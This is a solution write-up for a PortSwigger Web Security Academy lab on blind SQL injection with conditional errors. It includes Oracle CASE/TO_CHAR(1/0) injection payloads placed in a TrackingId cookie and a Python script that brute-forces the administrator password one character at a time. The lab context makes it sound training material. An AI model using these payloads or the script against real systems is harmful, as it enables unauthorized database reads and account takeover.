# Lab 10: Blind SQL injection with conditional errors

## Description

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

---

## Solution

The goal of the exercise is to exploit a SQL-injectable cookie to read the `administrator` account's password and use it to login.

The vulnerable cookie is the `TrackingId` cookie, which is presumably used in a query that looks like the following.

```sql
SELECT TrackingId FROM TrackingIds WHERE TrackingId = '$TRACKING_ID'
```

As the description says, this web application doesn't return the results of the SQL query and the application doesn't respond any differently based on whether the query returns any rows. However, if the SQL query causes an error, the application will return an error. Based on this description, the backend server code probably looks something like:

```python
tracking_id = request.cookies['TrackingId']
sql_query = f"SELECT TrackingId FROM TrackingIds WHERE TrackingId = '{tracking_id}'"
try:
	rows = db.execute(sql_query)
except SQLError:
	render("Error Page")  # In the case of a SQL error, render an error page
else:
	if len(rows) == 1:
		do_some_background_tracking(rows[0].TrackingId)
	render("Home Page")  # If no SQL error, render the home page
```

The only feedback the web application will provide us is whether or not our SQL query produces an error. However, feedback is feedback. Any feedback can be used to interrogate the database and differentiate between true and false conditions.

Before we can know exactly how to format our injected SQL, we need to determine the database type. We can quickly enumerate the number of columns in the original SQL query to determine that there is 2 and that they are both of type string. We then iterate through version queries for the major database platforms and note which cause the web application to throw errors and which don't. Oracle's `SELECT banner FROM v$version` is the only query that doesn't cause the web application to throw an error, indicating that the target database is Oracle.

With that in mind, we'll inject the following SQL query to interrogate the database and differentiate between true and false conditions.

```sql
SELECT
CASE
	WHEN ($CONDITION)
		THEN TO_CHAR(1/0)
	ELSE 'a'
END
FROM users
WHERE username = 'administrator'
```

First, we'll iteratively use this SQL query template to determine the number of characters in `administrator's` password.

```sql
SELECT
CASE
	WHEN (LENGTH(password) = $N)
		THEN TO_CHAR(1/0)
	ELSE 'a'
END
FROM users
WHERE username = 'administrator'
```

which results in the following SQL query:

```sql
SELECT TrackingId FROM TrackingIds WHERE TrackingId = 'mvdV0sPOiMwwSEVe' AND (SELECT CASE WHEN (LENGTH(password) > $N THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a'--'
```

Using this technique, we determine that `administrator`'s password is 20 characters long. With the length in hand, we'll iteratively reuse the above SQL query template to brute force `administrator`'s password.

```sql
SELECT
CASE
	WHEN (SUBSTR(password, $INDEX, 1) = '$CHARACTER')
		THEN TO_CHAR(1/0)
	ELSE 'a'
END
FROM users
WHERE username = 'administrator'
```

which results in the following SQL query:

```sql
SELECT TrackingId FROM TrackingIds WHERE TrackingId = 'mvdV0sPOiMwwSEVe' AND (SELECT CASE WHEN (SUBSTR(password, $INDEX, 1) = '$CHARACTER') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a'--'
```

We automate the process of iterating through character indices and characters using the following Python script.

```python
import requests
import string

with open("password.txt", "a") as f:
    for i in range(1, 21):
        for c in string.printable:
            response = requests.get(
                "https://ac881f951ec04ffd80a200f2000b005b.web-security-academy.net/filter?category=Pets",
                cookies={
                    "TrackingId": f"mvdV0sPOiMwwSEVe' AND (SELECT CASE WHEN (SUBSTR(password, {i}, 1) = '{c}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a'--",
                    "session": "avzTVjCw53jVthSWvmSwMvVChFrXiMoU"
                }
            )
            if response.status_code == 500:
                f.write(c)
                f.flush()
                break
            print(f"[*] Progress: character index {i}, character {c}", end="\r")

    f.write("\n")
```

We determine that `administrator`'s password is  `u3w7761huw45vmxea2pj`.
